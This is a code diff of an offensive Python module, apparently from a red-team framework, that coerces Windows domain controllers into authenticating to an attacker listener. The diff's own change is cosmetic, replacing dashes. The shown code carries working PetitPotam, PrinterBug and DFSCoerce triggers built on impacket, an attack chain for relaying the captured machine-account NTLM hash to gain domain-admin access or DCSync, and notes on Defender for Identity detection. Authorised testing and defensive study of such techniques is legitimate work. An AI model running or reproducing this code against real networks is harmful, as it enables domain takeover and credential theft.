@@ -1,15 +1,15 @@
 """
-Authentication Coercion — ad.coerce
-MITRE: T1187 — Forced Authentication
+Authentication Coercion - ad.coerce
+MITRE: T1187 - Forced Authentication
 
 Forces a target machine (typically DC) to authenticate to an attacker-controlled
 listener via three RPC methods. Used with lateral.smb_relay to capture and relay
 the machine account's NTLM hash.
 
 Three coercion methods:
-  PetitPotam  (MS-EFSRPC)  — EfsRpcOpenFileRaw, works unauthenticated on unpatched
-  PrinterBug  (MS-RPRN)    — RpcRemoteFindFirstPrinterChangeNotification, needs domain creds
-  DFSCoerce   (MS-DFSNM)   — NetrDfsAddStdRoot, needs domain creds
+  PetitPotam  (MS-EFSRPC)  - EfsRpcOpenFileRaw, works unauthenticated on unpatched
+  PrinterBug  (MS-RPRN)    - RpcRemoteFindFirstPrinterChangeNotification, needs domain creds
+  DFSCoerce   (MS-DFSNM)   - NetrDfsAddStdRoot, needs domain creds
 
 Attack chain:
   lateral.smb_relay running (listener on attacker IP:445) →
@@ -17,7 +17,7 @@ Attack chain:
   smb_relay captures DC machine account NTLM →
   relay to LDAP/SMB for DA-level access or DCSync
 
-OPSEC: HIGH — MS-EFSRPC/MS-RPRN RPC call triggers MDI alert within seconds.
+OPSEC: HIGH - MS-EFSRPC/MS-RPRN RPC call triggers MDI alert within seconds.
        Blocked in STEALTH profile. Always use with smb_relay active.
 """
 from __future__ import annotations
@@ -57,7 +57,7 @@ logger = get_logger("ares.modules.ad.coerce")
 )
 class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
     """
-    ad.coerce — Force target to authenticate to attacker listener via PetitPotam (MS-EFSRPC
+    ad.coerce - Force target to authenticate to attacker listener via PetitPotam (MS-EFSRPC
 
     OPSEC: HIGH_NOISE
     MITRE: "T1187"
@@ -85,11 +85,11 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
         if not isinstance(ctx, ExecutionContext):
             return
 
-        # Stealth block — MDI triggers in seconds
+        # Stealth block - MDI triggers in seconds
         noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
         if noise == NoiseProfile.STEALTH:
             raise ModuleValidationError(
-                "ad.coerce is blocked in STEALTH profile — "
+                "ad.coerce is blocked in STEALTH profile - "
                 "MS-EFSRPC/MS-RPRN RPC calls trigger Microsoft Defender for Identity "
                 "alerts within seconds. Use NORMAL or AGGRESSIVE profile.",
                 module_id=self.MODULE_ID, field="noise_profile",
@@ -98,12 +98,12 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
         ad = self._extract_ad_params(ctx)
         if not ad["dc"]:
             raise ModuleValidationError(
-                "ad.coerce requires 'dc' — IP of the target to coerce.",
+                "ad.coerce requires 'dc' - IP of the target to coerce.",
                 module_id=self.MODULE_ID, field="dc",
             )
         if not ctx.params.get("listener_ip"):
             raise ModuleValidationError(
-                "ad.coerce requires 'listener_ip' — IP of your smb_relay listener. "
+                "ad.coerce requires 'listener_ip' - IP of your smb_relay listener. "
                 "Start lateral.smb_relay first, then run ad.coerce.",
                 module_id=self.MODULE_ID, field="listener_ip",
             )
@@ -221,7 +221,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
         await self.before_request(dc, "default")
         logger.warning("coerce_start",
                        target=dc, listener=listener_ip, method=method,
-                       msg="HIGH_NOISE — TRIGGERS_MDI")
+                       msg="HIGH_NOISE - TRIGGERS_MDI")
         audit("authentication_coercion", actor=username or "operator",
               technique="T1187", source="operator",
               target=dc, detail=f"listener={listener_ip} method={method}")
@@ -298,7 +298,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             )
         else:
             self.finding(
-                title       = f"Coercion Attempted on {dc} — No Confirmation",
+                title       = f"Coercion Attempted on {dc} - No Confirmation",
                 description = (
                     "Authentication coercion RPC call sent but no confirmation received. "
                     "Check lateral.smb_relay for captured credentials."
@@ -321,7 +321,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
 
     def _petitpotam_sync(self, dc: str, listener_ip: str,
                           username: str, password: str, domain: str) -> bool:
-        """MS-EFSRPC: EfsRpcOpenFileRaw — works unauthenticated on unpatched systems."""
+        """MS-EFSRPC: EfsRpcOpenFileRaw - works unauthenticated on unpatched systems."""
         try:
             from impacket.dcerpc.v5 import transport, efsrpc
             from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -343,7 +343,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             try:
                 efsrpc.hEfsRpcOpenFileRaw(dce, unc_path, 0)
             except DCERPCException:
-                pass   # expected — DC will attempt auth before this fails
+                pass   # expected - DC will attempt auth before this fails
             finally:
                 try:
                     dce.disconnect()
@@ -356,7 +356,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
 
     def _printerbug_sync(self, dc: str, listener_ip: str,
                           username: str, password: str, domain: str) -> bool:
-        """MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification — needs domain creds."""
+        """MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification - needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, rprn
             from impacket.dcerpc.v5.dtypes import NULL
@@ -382,7 +382,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
                     dce, handle, 0x00000100, 0, f"\\\\{listener_ip}", NULL
                 )
             except DCERPCException:
-                pass   # expected error — trigger happened
+                pass   # expected error - trigger happened
             finally:
                 try:
                     rprn.hRpcClosePrinter(dce, handle)
@@ -396,7 +396,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
 
     def _dfscoerce_sync(self, dc: str, listener_ip: str,
                          username: str, password: str, domain: str) -> bool:
-        """MS-DFSNM: NetrDfsAddStdRoot — needs domain creds."""
+        """MS-DFSNM: NetrDfsAddStdRoot - needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, dfsnm
             from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -414,7 +414,7 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             try:
                 dfsnm.hNetrDfsAddStdRoot(dce, f"\\\\{listener_ip}\\share", "share", 0)
             except DCERPCException:
-                pass   # expected — trigger happened
+                pass   # expected - trigger happened
             finally:
                 try:
                     dce.disconnect()
